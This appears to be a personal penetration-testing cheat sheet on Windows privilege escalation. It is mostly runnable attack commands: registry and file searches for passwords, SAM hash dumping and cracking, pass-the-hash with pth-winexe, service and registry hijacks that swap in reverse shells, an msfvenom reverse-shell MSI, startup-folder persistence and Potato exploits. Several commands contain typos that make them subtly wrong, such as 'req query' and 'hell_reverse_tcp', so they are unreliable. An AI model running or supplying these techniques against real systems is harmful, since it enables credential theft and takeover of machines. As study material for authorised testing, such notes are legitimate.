# Tools

- [[PrintSpoofer]]
  https://github.com/itm4n/PrintSpoofer
- [[RoguePotato]]
  https://github.com/antonioCoco/RoguePotato

- [[winPEAS]]
  https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
- [[accesschk]]
  https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk

If accesschk does not shows "BUILTIN\USERS" but shows "RW NT AUTHORITY\INTERACTIVE", it means we can still modify it without a snag.
https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/bb726982(v=technet.10)?redirectedfrom=MSDN

> The Interactive identity Any user logged on to the local system has the Interactive identity. This identity is used to allow only local users to access a resource.

If our connection seems to be banned from a firewall,let's try to port forwarding.

```
.\plink.exe root@192.168.11.1 -R 445:127.0.0.1:445
```

# Scheduled Task

```
# List All scheduled tasks we can see:
schtasks /query /fo /LIST /v
```

# Password

## Passwords

Following commands search through Registry string "password"

```
req query HKLM /f password /t REG_SZ /s
req query HKCU /f password /t REG_SZ /s

# HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE
```

```
./winPEASany.exe quiet filesinfo userinfo
```

It shows the sections called `Looking for AutoLogon Credentials`, `Putty Sessions`.

It also can be verified by the following command

```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
reg query "HKCU\Software\${username}\PuTTY\Sessions"
```

Once credentials are verified, we can spawn shell from KALI

```
# admin
winexe -U 'admin%password123' // 192.168.0.1 cmd.exe
# system
winexe -U 'admin%password123' --system // 192.168.0.1 cmd.exe
```

## Saved Creds

```
./winPEASany.exe quiet cmd windowscreds
# Or it can be confirmed by cmdkey /list
```

It shows the section called `Checking Credential manager`.
We can use the credential with `runas` command.

```
runas /savecred /user:admin C:\reverse_shell.exe
```

## Configuration Files

There may be a files which contains credentials.

```
# Recursively search for files in the current directory with "pass" in the name, or ending in ".config"
dir /s *pass* == *.config
# Recursively search for files in the current directory that contain the world "password" and also end in either .xml,.ini,or .txt
findstr /si password *.xml *.ini *.txt
# WinPEAS
./winPEASany.exe quiet cmd searchfast filesinfo
# Check the `Looking for possible known files that can contain creds` section
```

## Security Account Manager (SAM)

The SAM and SYSTEM files are locatedin the `C:\Windows\System32\config` directory.
But the above file is locked while windows running.Backups can be found in `C:\WIndows\Repair` or `C:\Windows\System32\config\RegBack`
The above WInPEAS command shows such backups.
Let's copy the backups to KALI and crack it.

```
git clone https://github.com/CiscoCXSecurity/creddump7
cd creddump7
python2 pwdump.py ./SYSTEM ./SAM
# admin:1004:aad3b435b...:a9fd...
```

Let's see the dumped hash.
The first part is the L.M Hash,which is obsoleted.so it is always the L.M Hash of an empty string.
The second part is NTLM hash.So let's crack it .

#### If NTLM Hash start with `31d6`, it is a hash of an empty string, so it means the user is disabled or has no password.

```
hashcat -m 1000 --force a9fd... /usr/share/wordlists/rockyou.txt
```

## Pass the Hash

In the above section,we tried cracking the admin's hash by hashcat,
but by using pth-winexe,we can pass the hash self and bypass the authentication.

```
pth-winexe -U 'admin%aad3b435b...:a9fd...' //192.168.0.2 cmd.exe
# system
pth-winexe --system -U 'admin%aad3b435b...:a9fd...' //192.168.0.2 cmd.exe
```

# Service Exploit

## DLL Hijacking

```
./winPEASany.exe quiet servicesinfo
```

It shows the section named "Checking write permissions in PATH folders (DLL Hijacking)".
In the section you may see like `(DLL Hijacking) C:\Temp: Authenticated Users (WriteData/CreateData)`
It means that we can play as we kile in the `Temp` folder, so if a service calls `dll` in the folder, we can override it with a reverse shell.

But to find such services, we are coerced to execute one by one service and verify if it includes `dll`, which is in the above file.

So we download one executables to our local machine,execute it with Admin privilege and monitor its behavior by Procmon.

## Insecure Service Executables

It's a simple method.
If a original service executable is modifiable,simply we replace it with a reverse shell.

```
./winPEASany.exe quiet servicesinfo
```

Let.s refer the section `Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths`

```
copy /Y ./reverse_shell "C:\Program Files\Path To Listed Above"
net start the-service
```

## Weak Reasistry Permission

```
./winPEASany.exe quiet servicesinfo
```

It indicates `Looking if you can modify any service registry` section.
Provided it indicates we can modify `HKLM\SYSTEM\CurrentControlSet\Services\regsvc`.

```
accesschk.exe /accepteula -uwqkv HKLM\SYSTEM\CurrentControlSet\Services\regsvc
# confirm whether we can start and stop the service
accesschk.exe /accepteula -ucqv ${account name} regsvc
# show state of the service
reg query HKLM\SYSTEM\CurrentControlSet\Services\regsvc
# modify its imagePath to our rverse shell.
reg add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Downloads\r_shell.exe /f
net start regsvc
```

## Insecure Service Permissions

- If our login user can change the configuration of a service that runs with SYSTEM privilege, we can change the executable the service uses to one of our own.
- But be aware of whether you can stop/start the service. If you can't.It means it is possibly a rabbit hole.

```
# show misconfigured servicesinfo
./winPEASany.exe quiet servicesinfo
```

Assuming the above command shows we may change the configuration of `daclsvc`.  
Let's start by configuring our user's access check.

```
# acceptula to suppress eula - a popup that asks users whether they accept the license or not.
# check current account's permission to daclsvc
accesschk.exe /accepteula -uwqcv ${acount name} daclsvc
```

If the result does not contain either "SERVICE_START" or "SERVICE_STOP", **it means using that process is little avail.**

Let's check `daclsvc`'s state

```
# check whole state
sc qc daclsvc
# check current state
sc query daclsvc
```

```
config daclsvc binpath = "\"C:\path\to\reverse_shell.exe\""
# After setting reverse shell receiver in KALI
net start daclsvc
```

## Unquoted Service Path

```
./winPEASany.exe quiet servicesinfo
```

The above command sometimes shows executables whose PATH contains spaces.
Assuming the above command shows \_C:\Program Files\Unquoted Service\Common Files\unquotedsvc.exe

```
accesschk.exe /accepteula -uwqcv ${acount name} unquotedsvc
```

If you can start and stop the svc,let's go ahead.

```
# check if we can create file in the specific directory
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Service"
```

If it shows "RW BUILDIN\Users",it means we can create any files in the directory.
When we execute unquotedsvc.exe, WINDOWS seeks "C:\Program Files\Unquoted Service\Commen Files" and trys execute "C:\Program Files\Unquoted Service\Commen.exe Files".
So by creating Common.exe,we can make it calls when svc is invoked.

```
copy reverse_shell.exe "C:\Program Files\Unquoted Service\Common.exe"
net start unquotedsvc
```

# Registry Exploit

## Always Install Elevated

This method onliy works when Registiry value `AlwaysInstallElevated` for the local machine and the current user is set to `1`

```
./winPEASany.exe quiet windowscreds
```

It shows the result under a section named `Checking AlwaysInstallElevated`.

Let's create a revere shell whose extension is _.msi_

```
msfvenom -p windows/x64/hell_reverse_tcp LHOST=${your ip} LPORT=53 -f msi -o ./reverse.msi
# send it Windows,and simply execute it on windows machine
msiexec /quiet /qn /i reverse.msi
```

## AutoRuns

```
./winPEASany.exe quiet applicationsinfo
```

It shows `Autorun Applications`.
Let's further check if there is any progrrames that we can access.

> Folder: C:\Program Files\Autorun Program
> File: C:\Program Files\Autorun Program\program.exe
> FilePerms: Everyone [AllAccess] # Вот это!
> RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVirsion\Run

```
# Enumarates the programmes
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVirsion\Run
# My Program REG_SZ "C:\Program Files\Autorun Program\program.exe"
accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
# RW Everyone FILE_ALL_ACCESS
copy /Y reverse_shell.exe "C:\Program Files\Autorun Program\program.exe"
# Then restart Windows.
```

# Installed App

```
./winPEASany.exe quiet processinfo
```

# Hot Potato

This method works only on WIndows 7,8,early version of 10.

```
.\potato.exe -ip ${current windows ip} -cmd "C:\reverse_shell.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
```

# Startups

```
accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

If we can create a shortcut within the folder,let's create it!

```
# CreateShortcut.vbs
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\reverse.exe"
oLink.Save
```

```
cscript CreateShortcut.vbs
```

Let's wait for admin's login....

# Kernel Expoit

**Kernel Exploit may cause a system crash, on top of that, it succeed rarely. So this is a sort of last resort.**

- wesng
  > WES-NG is a tool based on the output of Windows' systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 11, including their Windows Server counterparts, is supported.

https://github.com/bitsadmin/wesng

- Compiled exploits
  https://github.com/SecWiki/windows-kernel-exploits

1. systeminfo

```sh
systeminfo > systeminfo.txt
```

2. Find valid kernel expoit scripts.

```shell
python wes.py ~/Downloads/systeminfo.txt -i 'Elevation of Privilege' --exploits-only
```

You can find exploits by CVE reference in the above windows-kernel-exproits repository.
